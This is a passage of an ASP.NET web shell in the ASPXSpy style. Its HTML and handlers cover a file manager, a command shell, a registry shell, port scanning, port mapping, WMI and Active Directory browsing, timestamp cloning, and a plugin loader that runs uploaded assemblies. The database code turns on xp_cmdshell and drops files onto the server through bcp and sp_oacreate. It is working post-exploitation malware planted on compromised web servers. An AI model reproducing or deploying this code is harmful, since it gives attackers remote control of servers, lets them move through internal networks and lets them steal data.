	protected void ndbxjeiuUI(object sender,EventArgs e)
	{
		Bin_H2_Title.InnerText="Services >>";
		Hide_Div();
		Bin_Div_Services.Visible=true;
		try{gtsrvvmiLoL();}catch{try{gtsrvLoL();}catch(Exception ex){ee_ShowErr(ex);}}
	}
	protected void cespludurlA(object sender,EventArgs e)
	{
		benssyS();
	}
	protected void cespludurEV(object sender,EventArgs e)
	{
		Hide_Div();
		Bin_Div_Userinfo.Visible=true;
		Bin_H2_Title.InnerText="User Information >>";
		try{benssEEv();}catch{try{Bin_UserInfo();}catch(Exception ex){ee_ShowErr(ex);}}
	}
	protected void cespludurEAA(object sender,EventArgs e)
	{
		bnRgg();
	}
	protected void cespludurB(object sender,EventArgs e)
	{
		euDBee();
	}
	protected void cespludurYT(object sender,EventArgs e)
	{
		switch(((Control)sender).ID.ToString())
		{
			case "Bin_List_Connstr":
				Bin_Div_DBPanel.Visible=false;
				Bin_TextBox_ConnStr.Text=Bin_List_Connstr.SelectedItem.Value.ToString();
				break;
			case "Bin_Button_Show":
			case "Bin_List_DB":
				Bin_DataBind();
				break;
			case "Bin_List_Exec":
                string selectstr=Bin_List_Exec.SelectedItem.Value.ToString();
                if (selectstr == "SA_Upfile")
                {
                    Bin_Div_saupfile.Visible=true;
                }
                else if (selectstr == "FileCopy")
                {
                    zemfokemMdfedeeLL.Visible = true;
                }
                else
                {
                    Bin_Textarea_Query.InnerText = selectstr;
                }
				break;
			case "Bin_List_Code":
				BonCreateF(Bin_TextBox_Fp.Value);
				break;
		}
	}
	protected void cespludEr(object sender,EventArgs e)
	{
		FleBnn(Bin_TextBox_Path.Value);
	}
	protected void cespludNEE(object sender,EventArgs e)
	{
		feeConss();
	}
	protected void cespludeBol(object sender,EventArgs e)
	{
		ehPrtOO();
	}
	protected void cespluVEU(object sender,EventArgs e)
	{
		BENppmm();
	}
    protected void cespLas(object sender, EventArgs e)
    {
        KEjfsjJ();
    }
	protected void pOZiuCC(object sender,EventArgs e)
	{
		try{
		if(Session[PMCacheName]==null||!(Session[PMCacheName] is Hashtable))
		{
			bnMsgg("List is empty.");
		}else{
		zemfokNEK.Visible=true;
		Hashtable ht=Session[PMCacheName] as Hashtable;
		int count=0,connected=0,closed=0;
		foreach(DictionaryEntry de in ht)
			{
				PrtFeedd pf=de.Value as PrtFeedd;
				if(pf!=null){
				count++;
				TableRow tr=efefskdKK();
				TableCell tc=new TableCell();
				tc.Text=de.Key.ToString();
				tr.Cells.Add(tc);
				tc=new TableCell();
				tc.Text=string.Format("{0}:{1}",pf.RemoteAddress,pf.RemotePort);
				tr.Cells.Add(tc);
				tc=new TableCell();
				tc.Text=string.Format("{0}:{1}",pf.LocalAddress,pf.LocalPort);
				tr.Cells.Add(tc);
				tc=new TableCell();
				if(pf.IsConnected){tc.Text="Connected";connected++;}
				else{tc.Text="Closed";closed++;}
				tr.Cells.Add(tc);
				tc=new TableCell();
				tc.Text="<a href=\"javascript:Bin_PostBack('pazelVS','"+Bin_ToBase64(de.Key.ToString())+"')\">Close</a>";
				tr.Cells.Add(tc);
				zemfokNEK.Rows.Add(tr);}
			}if(count==0){bnMsgg("List is empty.");}else{bnMsgg(string.Format("Total {0} PortMap(s) cached ,{1} Connected ,{2} Closed",count,connected,closed));}
		}
		}catch(Exception ex){ee_ShowErr(ex);}
	}
	private void pazelVS(string id)
	{
		if(Session[PMCacheName]==null||!(Session[PMCacheName] is Hashtable))
		{
			bnMsgg("List is empty.");
		}else{
		Hashtable ht=Session[PMCacheName] as Hashtable;
		PrtFeedd pf=ht[id] as PrtFeedd;
		if(pf!=null){pf.Stop();ht.Remove(id);}
		pOZiuCC(null,null);bnMsgg("PortMap of ID:"+id+" Closeed.");
		}
	}
	protected void pazelesPM(object sender,EventArgs e)
	{
		if(Session[PMCacheName]==null||!(Session[PMCacheName] is Hashtable))
		{
			bnMsgg("List is empty.");
		}else{
		Hashtable ht=Session[PMCacheName] as Hashtable;
		foreach(DictionaryEntry de in ht)
			{
				PrtFeedd pf=de.Value as PrtFeedd;
				if(pf!=null){pf.Stop();}
			}
		ht.Clear();bnMsgg("All PortMap(s) closed");
		}
	}
	protected void pazelestu(object sender,EventArgs e)
	{
		try{
		if(esRvE.Value=="" || zemfoksdkKE.Value.Length<7 || esRceze.Value=="")return;
		int rport=int.Parse(esRceze.Value);
		int lport=int.Parse(esRvE.Value);
		PrtFeedd pf=new PrtFeedd();
		pf.Start(esRcezeOU.Value,rport,zemfoksdkKE.Value,lport);
		if(Session[PMCacheName]==null||!(Session[PMCacheName] is Hashtable))
		{
			try{Session[PMCacheName]=new Hashtable();}catch{bnMsgg("Session not enable,List while unavailable");}
		}
		string s=Guid.NewGuid().ToString();
		Hashtable ht=Session[PMCacheName] as Hashtable;
		ht[s]=pf;
		bnMsgg(String.Format("PortMap of ID: {0} Started.",s));
		}catch(Exception ex){ee_ShowErr(ex);}
	}
	protected void lkkEIU(object sender,EventArgs e)
	{
		ArrayList ScanResults=new ArrayList();
		try
		{
			new SocketPermission(NetworkAccess.Connect,TransportType.Tcp,Bin_TextBox_Sip.Text,-1).Demand();
			string[] ports=Bin_TextBox_Sport.Text.Split(',');
			for(int i=0;i<ports.Length;i++)
			{
				int p=0;
				if(Int32.TryParse(ports[i],out p)){ScanResults.Add(new ScnpRt(Bin_TextBox_Sip.Text,p));}
			}
			Thread[] lThreads=new Thread[ScanResults.Count];
			int idx=0;
			for(idx=0;idx<ScanResults.Count;idx++)
			{
				lThreads[idx]=new Thread(new ThreadStart(((ScnpRt)ScanResults[idx]).Scan));
				lThreads[idx].Start();
			}
			for(idx=0;idx<lThreads.Length;idx++){lThreads[idx].Join();}
		}
		catch(SocketException){bnMsgg("Host not found.");}
		catch(Exception ex){ee_ShowErr(ex);}
		Bin_Label_Scanres.Visible=true;
		string res="";
		foreach(ScnpRt th in ScanResults){res+=th.ip+" : "+th.port+" ................................. "+th.status+"<br>";}
		Bin_Label_Scanres.InnerHtml=res;
	}
	protected void lkkvnekL(object sender,EventArgs e)
	{
		Bin_Button_Export.Visible=true;
		eNExcBnd();
	}
	protected void lkkvnekzeo(object sender,EventArgs e)
	{
		try
		{
			OpenConnection();
			if(Bin_List_Connstr.SelectedItem.Text=="MSSQL")
			{
				if(Bin_List_DB.SelectedItem.Value!="")
				{
					conn.ChangeDatabase(Bin_List_DB.SelectedItem.Value.ToString());
				}
			}
			DataTable dt=Bin_DataTable(Bin_Textarea_Query.InnerText);
			string fname="Query.xls";
			Match mat=Regex.Match(Bin_Textarea_Query.InnerText,@"(?<= from \[?)[\w.]+");
			if (mat.Success)
			{
				fname=mat.Value+".xls";
			}
			if (dt.Columns.Count>0)
			{
				Response.AddHeader("Content-Disposition","attachment;filename="+fname);
				Response.ContentType="application/ms-excel";
				{
					Response.Write("<table border=1><tr>\r\n");
					foreach(DataColumn subcol in dt.Columns)
					{
						Response.Write("<td><b>"+subcol.ColumnName+"</b></td>");
					}
					Response.Write("</tr>");
					foreach(DataRow subrow in dt.Rows)
					{
						Response.Write("<tr>");
						for (int i=0;i<subrow.ItemArray.Length;i++)
						{
							Response.Write("<td>"+subrow.ItemArray[i].ToString()+"</td>");
						}
						Response.Write("</tr>");
					}
					Response.Write("</table>\r\n");
				}
				Response.End();
			}
			else{bnMsgg("No data!");}
		}
		catch (Exception ex){ee_ShowErr(ex);}
	}
    protected void lkkvnekzexxX(object sender, EventArgs e)
    {
        Bin_Div_saupfile.Visible=true;
        eNExQsl("IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp");
        eNExQsl("IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp");
        string strfrm="8.0|1|1       SQLIMAGE      0       0       \"\"                        1     safile     \"\"";
        eNExQsl("CREATE TABLE bin_temp(safile image)");
        Byte[] b = new byte[Bin_TextBox_SaFile.PostedFile.InputStream.Length];
        Stream i = Bin_TextBox_SaFile.PostedFile.InputStream;
        i.Read(b, 0, b.Length);
        try
        {
            OpenConnection();
            string db = conn.Database;
            comm.CommandText = "insert into [bin_temp] values(@P1);";
			DbParameter dp=new SqlParameter("@P1", SqlDbType.Image);
			dp.Value = b;
            comm.Parameters.Add(dp);
            comm.ExecuteNonQuery();
            string verstr = Bin_DataTable(@"SELECT @@VERSION").Rows[0][0].ToString();
            if (verstr.IndexOf("2005") > 0)
            {
                strfrm.Replace("8.0", "9.0");
                eNExQsl("EXEC master..sp_configure 'show advanced options', 1;RECONFIGURE;EXEC master..sp_configure 'xp_cmdshell', 1;RECONFIGURE;");
            }
            string[] arrfrm = strfrm.Split('|');
            foreach (string substrfrm in arrfrm)
            {
                eNExQsl("EXEC master..xp_cmdshell 'echo " + substrfrm + " >> c:\\windows\\temp\\tmp.fmt'");
            }
            eNExQsl("exec master..xp_cmdshell'bcp \"select safile from " + db + "..bin_temp\" queryout \"" + Bin_TextBox_SavePath.Value + "\" -T -f c:\\windows\\temp\\tmp.fmt'");
            eNExQsl("If object_id('bin_temp')is not null drop table bin_temp");
            eNExQsl("EXECUTE master..xp_cmdshell 'del c:\\windows\\temp\\tmp.fmt'");
            string res = Bin_DataTable("EXECUTE master..xp_fileexist '" + Bin_TextBox_SavePath.Value + "'").Rows[0][0].ToString();
            if (res == "1")
            {
                bnMsgg("File uploaded,Good Luck!");
            }
            else{bnMsgg("Upload failed,Sorry!");}
            
        }
        catch (Exception ex)
        {
            ee_ShowErr(ex);
        }               
    }

    protected void lkkvLKve(object sender, EventArgs e)
    {
        zemfokemMdfedeeLL.Visible = true;
        try
        {
            IDictionary dic = Environment.GetEnvironmentVariables();
            string tmppath = dic["TMP"].ToString();
            if(eNExQsl("exec master..xp_makecab '" + tmppath + "\\~098611.tmp','default',1,'" + Bin_TextBox_Source.Value + "';exec master..xp_unpackcab '" + tmppath + "\\~098611.tmp','" + Path.GetDirectoryName(zemfokemMdfede.Value) + "',1,'" + Path.GetFileName(zemfokemMdfede.Value) + "'")){bnMsgg("File Copyed,Good Luck!");}
        }
        catch (Exception ex)
        {
            ee_ShowErr(ex);
        }
    }

    protected void lkkvnekzexxXE(object sender, EventArgs e)
    {
        zemfokemMdfedeeLL.Visible = true;
        try
        {
            if(eNExQsl("declare @a int;exec master..sp_oacreate'Scripting.FileSystemObject',@a output;exec master..sp_oamethod @a,'CopyFile',null,'" + Bin_TextBox_Source.Value + "','" + zemfokemMdfede.Value+ "'")){     bnMsgg("File Copyed,Good Luck!");}
        }
        catch (Exception ex)
        {
            bnMsgg(ex.Message);
        }

    }
    protected void lkkvLK(object sender, EventArgs e)
    {
        if (Bin_TextBox_WmiString.Text != "")
        {
            Bin_Div_WmiPanel.Visible = true;
            try
            {
				euVezlwqKV.PreRender+=new EventHandler(DataGrid_PreRender);
				if(string.IsNullOrEmpty(zcg_txbWmiComputer.Text))
				{
					euVezlwqKV.DataSource=zcg_WmiDataTable(zcg_txbWmiNamespace.Text,Bin_TextBox_WmiString.Text);
				}
				else
				{
					euVezlwqKV.DataSource=zcg_WmiDataTable(zcg_txbWmiComputer.Text,zcg_txbWmiUserName.Text,zcg_txbWmiPassword.Text,zcg_txbWmiNamespace.Text,Bin_TextBox_WmiString.Text);
				}
				euVezlwqKV.DataBind();
				for(int i=0;i<euVezlwqKV.Items.Count;i++)
				{
					fdsCtrll(euVezlwqKV.Items[i]);
				}
            }
            catch (Exception ex)
            {
                ee_ShowErr(ex);
            }
        }
    }
	
	[DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
	private static extern bool LookupAccountName(string machineName, string accountName, byte[] sid, ref int sidLen, StringBuilder domainName, ref int domainNameLen, out int peUse);
	private string zcg_GetCurrentDomain()
	{
		try{return zcg_WmiDataTable("root\\CIMV2","select Domain from Win32_ComputerSystem").Rows[0]["Domain"] as string;}
		catch{
			try{string s = Environment.UserDomainName;
			int num3;
			byte[] sid = new byte[0x400];
			int length = sid.Length;
			StringBuilder domainName = new StringBuilder(0x400);
			int capacity = domainName.Capacity;
			if(!string.Equals(s,"NT AUTHORITY"))
			{
				return s;
			}
			else if (LookupAccountName(null, dmnusrname, sid, ref length, domainName, ref capacity, out num3))
			{
				return domainName.ToString();
			}return Environment.MachineName;}catch{return Environment.MachineName;}
		}
	}
	protected void lkkvLKveUT(object sender,EventArgs e)
    {
        Hide_Div();
		try{
        euhAllezlwVOU.Visible = true;
		euhtaqoiiV.CommandArgument="WinNT://"+Environment.MachineName;
		euhtakoiii.CommandArgument="WinNT://"+zcg_GetCurrentDomain();
		}catch(Exception ex){ee_ShowErr(ex);}
        Bin_H2_Title.InnerText = "ADS Viewer >>";        
    }
	protected void lkkvLKveUTss(object sender,EventArgs e)
	{
		if(!string.IsNullOrEmpty(euhAllezlwRE.Value.Trim()))
		{
			try{
				if(!string.IsNullOrEmpty(euhAllezlwo.Value.Trim()))
				{
					lkesLKE(euhAllezlwRE.Value.Trim(),euhAllezlwo.Value.Trim(),ztxbED.Value.Trim(),euhAllezlwa.Value,euhtaquoistpS.Value);
				}else{
				lkesLKEveeD(euhAllezlwRE.Value.Trim(),ztxbED.Value.Trim(),euhAllezlwa.Value,euhtaquoistpS.Value);
				}
			}
			catch(Exception ex){ee_ShowErr(ex);}
		}
	}
	protected void lkkvLKvRR(object sender,EventArgs e)
	{
		string ADSPath=(sender as LinkButton).CommandArgument;
		euhAllezlwRE.Value=ADSPath;
		try{lkesLKEveeD(ADSPath,null,null,euhtaquoistpS.Value);}
		catch(Exception ex){ee_ShowErr(ex);}
	}
	private void lkesLKE(string ADSPath,string ADSFilter,string ADSUserName,string ADSPassWord,string AuthType)
	{
		DirectorySearcher ds=null;
		SearchResultCollection sc=null;
		try
		{
			new DirectoryServicesPermission(DirectoryServicesPermissionAccess.Browse,ADSPath).Demand();
			AuthenticationTypes t=(AuthenticationTypes)(Convert.ToInt32(AuthType));
			DirectoryEntry dire=null;
			TableCell tc=null;
			if(!string.IsNullOrEmpty(ADSUserName))
			{
				dire=new DirectoryEntry(ADSPath,ADSUserName,ADSPassWord,t);
			}
			else
			{
				dire=new DirectoryEntry(ADSPath);
				dire.AuthenticationType=t;
			}
			zcg_lbl_Schema.Text="SearchResult";
			ds=new DirectorySearcher(dire,ADSFilter);
			sc=ds.FindAll();
			foreach(SearchResult sr in sc)
			{
				TableRow tr=efefskdKK();
				tc=new TableCell();
				tc.Text=lkesLKEveeDug(sr.Path);
				tr.Cells.Add(tc);
				tc=new TableCell();
				tc.Text="Search Result Entry";
				tr.Cells.Add(tc);
				tc=new TableCell();
				tc.Text="Unknown";
				tr.Cells.Add(tc);
				tc=new TableCell();
				tc.Text="--";
				tr.Cells.Add(tc);
				tc=new TableCell();
				tc.Text=lkesLKEveeDug(sr.Path);
				tr.Cells.Add(tc);
				zcg_tbl_ADSViewer.Rows.Add(tr);
			}
		}
		catch(Exception ex)
		{
			ee_ShowErr(ex);
		}
		finally
		{
			if(ds!=null){ds.Dispose();}
			if(sc!=null){sc.Dispose();}
		}
	}
	private void lkesLKEveeD(string ADSPath,string ADSUserName,string ADSPassWord,string AuthType)
	{
		try
		{
			new DirectoryServicesPermission(DirectoryServicesPermissionAccess.Browse,ADSPath).Demand();
			AuthenticationTypes t=(AuthenticationTypes)(Convert.ToInt32(AuthType));
			DirectoryEntry dire=null;
			DirectoryEntry parent=null;
			TableCell tc=null;
			if(!string.IsNullOrEmpty(ADSUserName))
			{
				dire=new DirectoryEntry(ADSPath,ADSUserName,ADSPassWord,t);
			}
			else
			{
				dire=new DirectoryEntry(ADSPath);
				dire.AuthenticationType=t;
			}
			try{zcg_lbl_Schema.Text=dire.SchemaClassName;}catch{zcg_lbl_Schema.Text="Unknown";}
			parent=dire.Parent;
			if(!string.Equals(parent.Path,"ADs:"))
			{
				TableRow tr=efefskdKK();
				tc=new TableCell();
				tc.Text=lkesLKEveeDug(dire.Parent.Path,"Parent DirectoryEntry");
				tr.Cells.Add(tc);
				tc=new TableCell();
				tc.Text="Parent Entry";
				tr.Cells.Add(tc);
				tc=new TableCell();
				try
				{
					tc.Text=parent.SchemaClassName;
					tr.Cells.Add(tc);
				}
				catch
				{
					tc.Text="Unknown";
					tr.Cells.Add(tc);
				}
				tc=new TableCell();
				tc.Text="--";
				tr.Cells.Add(tc);
				tc=new TableCell();
				tc.Text=lkesLKEveeDug(parent.Path);
				tr.Cells.Add(tc);
				zcg_tbl_ADSViewer.Rows.Add(tr);
			}
			foreach (DirectoryEntry child in dire.Children)
			{
				try
				{
					TableRow tr=efefskdKK();
					tc=new TableCell();
					tc.Text=lkesLKEveeDug(child.Path,child.Name);
					tr.Cells.Add(tc);
					tc=new TableCell();
					tc.Text="Child Entry";
					tr.Cells.Add(tc);
					try
					{
						tc=new TableCell();
						tc.Text=child.SchemaClassName;
						tr.Cells.Add(tc);
					}
					catch
					{
						tc=new TableCell();
						tc.Text="Unknown";
						tr.Cells.Add(tc);
					}
					tc=new TableCell();
					tc.Text="--";
					tr.Cells.Add(tc);
					tc=new TableCell();
					tc.Text=lkesLKEveeDug(child.Path);
					tr.Cells.Add(tc);
					zcg_tbl_ADSViewer.Rows.Add(tr);
				}
				catch{}
			}
			TableRow intr=new TableRow();
			intr.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
			intr.Attributes["bgcolor"]="#dddddd";
			TableCell intc=new TableCell();
			intc.Attributes["colspan"]="6" ;
			intc.Attributes["height"]="5";
			intr.Cells.Add(intc);
			zcg_tbl_ADSViewer.Rows.Add(intr);
			System.DirectoryServices.PropertyCollection pc=dire.Properties;
			foreach(object o in pc.PropertyNames)
			{
				try
				{
					if(o is string)
					{
						string tmps=null;
						object prop=pc[o as string].Value;
						if(prop is Array)
						{
							foreach(object op in prop as Array)
							{
								if(op is byte)
								{
									tmps+=((byte)op).ToString("X2");
								}
								else
								{
									tmps+=op.ToString();
									tmps+="<br />";
								}
							}
						}
						else
						{
							tmps=prop.ToString();
						}
						TableRow tr=efefskdKK();
						tc=new TableCell();
						tc.Text=o as string;
						tr.Cells.Add(tc);
						tc=new TableCell();
						tc.Text="Property";
						tr.Cells.Add(tc);
						tc=new TableCell();
						tc.Text="--";
						tr.Cells.Add(tc);
						tc=new TableCell();
						tc.Text=tmps;
						tr.Cells.Add(tc);
						tc=new TableCell();
						tc.Text="--";
						tr.Cells.Add(tc);
						zcg_tbl_ADSViewer.Rows.Add(tr);
					}
				}catch{}
			}
		} // La c'est Bon non 
		catch(Exception ex)
		{
			ee_ShowErr(ex);
		}
	}
	private string lkesLKEveeDug(params string[] ADSSettings)
	{
		if(ADSSettings.GetLength(0)>1)
		{
			return string.Format("<a href=\"javascript:Bin_PostBack('zcg_ListADS','{0}')\">{1}</a>",Bin_ToBase64(ADSSettings[0]),ADSSettings[1]);
		}
		return string.Format("<a href=\"javascript:Bin_PostBack('zcg_ListADS','{0}')\">{1}</a>",Bin_ToBase64(ADSSettings[0]),ADSSettings[0]);
	}
	protected void lkesLKEveeDuge(object sender,EventArgs e)
	{
		Hide_Div();
        zcg_div_Plugin.Visible = true;
        Bin_H2_Title.InnerText = "Plugin Loader >>";       
	}
	protected void lkesLKEveeDOG(object sender,EventArgs e)
	{
		zcg_div_PluginResult.InnerHtml="";
		try
		{
			if(zcg_plgFile.PostedFile.ContentLength==0){bnMsgg("No Plugin Selected");}
			else
			{
				Stream stream=null;MemoryStream mem=new MemoryStream();byte[] b = new byte[2048];int i = 0;
				if(bnTESSgae.Checked){stream=new DeflateStream(zcg_plgFile.PostedFile.InputStream, CompressionMode.Decompress);}
				else{stream=zcg_plgFile.PostedFile.InputStream;}
				do{i = stream.Read(b, 0, 2048);mem.Write(b, 0, i);} while (i != 0);
				stream.Close();b=mem.ToArray();mem.Close();
				string TypeName=string.IsNullOrEmpty(zcg_txbTypeName.Text)?"Zcg.Test.AspxSpyPlugins.TestPlugin":zcg_txbTypeName.Text;
				string MethodName=string.IsNullOrEmpty(bnTESSgann.Text)?"Test":bnTESSgann.Text;
				Type t=Assembly.Load(b).GetType(TypeName);
				if(t==null){bnMsgg("Type "+TypeName+" Not Found");}
				else{zcg_div_PluginResult.InnerHtml=String.Format("Result :<hr width=\"100%\" noshade/>"+(zcg_chbIsHtml.Checked?"{0}":"<pre><xmp>{0}</xmp></pre>"),t.InvokeMember(MethodName,BindingFlags.InvokeMethod|BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static,null,null,new object[]{zcg_txbParams.Text.Split(new string[1]{"\r\n"},StringSplitOptions.RemoveEmptyEntries)}));zcg_div_PluginResult.Visible=true;}
			}
		}
		catch(Exception ex){ee_ShowErr(ex);}
	}
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title><%=Version + " - " +Request.ServerVariables["SERVER_NAME"]%></title>
<style type="text/css">
.Bin_Style_Login{font:11px Verdana;BACKGROUND: #FFFFFF;border: 1px solid #666666;}
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:16px;}
.list{font:12px Arial,Tahoma;height:20px;}
.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;
        }
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.u1{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.u2{text-decoration: none;color:#777;float:left;display:block;width:350px;margin-right:10px;}
</style>
	<script type="text/javascript">
	function CheckAll(form){
	for(var i=0;i<form.elements.length;i++){
		var e=form.elements[i];
		if(e.name!='chkall')
		e.checked=form.chkall.checked;
	}
}
	</script>
</head>
<body style="margin:0;table-layout:fixed;">
	<form id="ASPXSpy" runat="server">
	<div id="Bin_Div_Login" runat="server" style=" margin:15px" enableviewstate="false" visible="false" >
		<span style="font:11px Verdana;">Password:</span>
		<asp:TextBox ID="Bin_TextBox_Login" runat="server" CssClass="Bin_Style_Login" ></asp:TextBox>
		<asp:Button ID="Bin_Button_Login" runat="server" Text="Login" CssClass="Bin_Style_Login" OnClick="Bin_Button_Login_Click"/>
	</div>
	<div id="Bin_Div_Content" runat="server">
	<div id="Bin_Div_Head" runat="server">
	<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head">
		<td ><span style="float:right;"><a href="http://www.google.com" target="_blank">WebShel Ver: <%=Version%></a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
	</tr>
	<tr class="alt1">
		<td><span style="float:right;" id="Bin_Span_FrameVersion" runat="server"></span>
			<asp:LinkButton ID="Bin_Button_Logout" runat="server" OnClick="Bin_Button_Logout_Click" Text="Logout" ></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_File" runat="server" Text="File Manager" OnClick="Bin_Button_File_Click"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_Search" runat="server" Text="FileSearch" OnClick="lfdseIIej"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_Cmd" runat="server" Text="CmdShell" OnClick="btUndfCsse"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_IISspy" runat="server" Text="IIS Spy" OnClick="btnspuclkCk"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_Process" runat="server" Text="Process" OnClick="bonebfujkkK"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_Services" runat="server" Text="Services" OnClick="ndbxjeiuUI"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_Userinfo" runat="server" Text="UserInfo" OnClick="cespludurEV"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_Sysinfo" runat="server" Text="SysInfo" OnClick="cespludurlA"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_Reg" runat="server" Text="RegShell" OnClick="cespludurEAA"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_PortScan" runat="server" Text="PortScan" OnClick="cespludeBol" ></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_DB" runat="server" Text="DataBase" OnClick="cespludurB"></asp:LinkButton> | <asp:LinkButton ID="Bin_Button_PortMap" runat="server" Text="PortMap" OnClick="cespluVEU"></asp:LinkButton> |<asp:LinkButton ID="Bin_Button_WmiTools" runat="server" Text="WmiTools" onclick="cespLas" ></asp:LinkButton> | <asp:LinkButton ID="zcg_lbtnADSViewer" runat="server" Text="ADSViewer" OnClick="lkkvLKveUT"></asp:LinkButton> | <asp:LinkButton ID="zcg_lbtnPlugin" runat="server" Text="PluginLoader" OnClick="lkesLKEveeDuge"></asp:LinkButton></td>
	</tr>
	</table>
	</div>
	<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
	<div id="Bin_Div_Msg" style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;" runat="server" visible="false" enableviewstate="false"></div>
	<h2 id="Bin_H2_Title" runat="server"></h2>
	<%--FileList--%>
	<div id="Bin_Div_File" runat="server">
	<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
 <tr>
	<td style=" white-space:nowrap">Current Directory : </td>
	<td style=" width:100%"><input class="input" id="Bin_TextBox_Path" type="text" style="width:97%;margin:0 8px;" runat="server"/>
	</td>
	<td style="white-space:nowrap" ><asp:Button ID="Bin_Button_Go" runat="server" Text="Go" CssClass="bt" OnClick="dskeuII"/></td>
 </tr>
	</table>
	<table width="100%" border="0" cellpadding="4" cellspacing="0">
	<tr class="alt1"><td style="padding:5px;">
	<div style="float:right;"><input id="Bin_Lable_File" class="input" runat="server" type="file" style=" height:22px"/>
	<asp:Button ID="Bin_Button_Upload" CssClass="bt" runat="server" Text="Upload" OnClick="lefkdUpefds"/></div><asp:LinkButton ID="Bin_Button_WebRoot" runat="server" Text="WebRoot" OnClick="keffdsdEEER"></asp:LinkButton> | <a href="#" id="Bin_Button_CreateDir" runat="server">Create Directory</a> | <a href="#" id="Bin_Button_CreateFile" runat="server">Create File</a>
	 | <span id="Bin_Span_Drv" runat="server"></span><a href="#" id="Bin_Button_KillMe" runat="server" style="color:Red">Kill Me</a>
	</td></tr>
		<asp:Table ID="Bin_Table_File" runat="server" Width="100%" CellSpacing="0" >
			<asp:TableRow CssClass="head"><asp:TableCell>&nbsp;</asp:TableCell><asp:TableCell>Filename</asp:TableCell><asp:TableCell Width="25%">Last modified</asp:TableCell><asp:TableCell Width="15%">Size</asp:TableCell><asp:TableCell Width="25%">Action</asp:TableCell></asp:TableRow>
		</asp:Table>
	</table>
	</div>
	<%--FileEdit--%>
	<div id="Bin_Div_Edit" runat="server">
	<p>Current File(import new file name and new file)<br/>
	<input class="input" id="Bin_TextBox_Fp" type="text" size="100" runat="server"/> <asp:DropDownList ID="Bin_List_Code" runat="server" CssClass="list" AutoPostBack="true" OnSelectedIndexChanged="cespludurYT"><asp:ListItem>Default</asp:ListItem><asp:ListItem>UTF-8</asp:ListItem></asp:DropDownList>
	</p>
	<p>File Content<br/>
	<textarea id="Bin_Textarea_Edit" runat="server" class="area" cols="100" rows="25" enableviewstate="false" ></textarea>
	</p>
	<p><asp:Button ID="Bin_Button_Save" runat="server" Text="Submit" CssClass="bt" OnClick="Bin_Button_Save_Click"/> <asp:Button ID="Bin_Button_Back" runat="server" Text="Back" CssClass="bt" OnClick="cespludEr"/></p>
	</div>
	<%--CloneTime--%>
	<div id="Bin_Div_Time" runat="server" enableviewstate="false" visible="false">
	<p>Alter file<br/><input class="input" id="Bin_TextBox_Sp" type="text" size="120" runat="server"/></p>
	<p>Reference file(fullpath)<br/><input class="input" id="Bin_TextBox_Dp" type="text" size="120" runat="server"/></p>
	<p><asp:Button ID="Bin_Button_Clone" runat="server" Text="Submit" CssClass="bt" OnClick="onyetlD"/></p>
	<h2>Set last modified &raquo;</h2>
	<p>Current file(fullpath)<br/><input class="input" id="Bin_TextBox_Sp1" type="text" size="120" runat="server"/></p>
	<p>
		<asp:CheckBox ID="Bin_CheckBox_ReadOnly" runat="server" Text="ReadOnly" EnableViewState="False"/>
		&nbsp;
		<asp:CheckBox ID="Bin_CheckBox_System" runat="server" Text="System" EnableViewState="False"/>
		&nbsp;
		<asp:CheckBox ID="Bin_CheckBox_Hiddent" runat="server" Text="Hidden" EnableViewState="False"/>
		&nbsp;
		<asp:CheckBox ID="Bin_CheckBox_Archive" runat="server" Text="Archive" EnableViewState="False"/>
	</p>
	<p><!-- 34483093490 -->
		CreationTime :
		<input class="input" id="Bin_TextBox_Creation" type="text" runat="server"/>
		LastWriteTime : <!-- 3448309320 -->
		<input class="input" id="Bin_TextBox_LastWrite" type="text" runat="server"/>
		LastAccessTime : <!-- 34483093190 -->
		<input class="input" id="Bin_TextBox_LastAccess" type="text" runat="server"/>
		</p>
		<p>
			<asp:Button ID="Bin_Button_Att" CssClass="bt" runat="server" Text="Submit" OnClick="dfskeiUZ"/>
		</p>
	</div>
	<%--IISSpy--%>
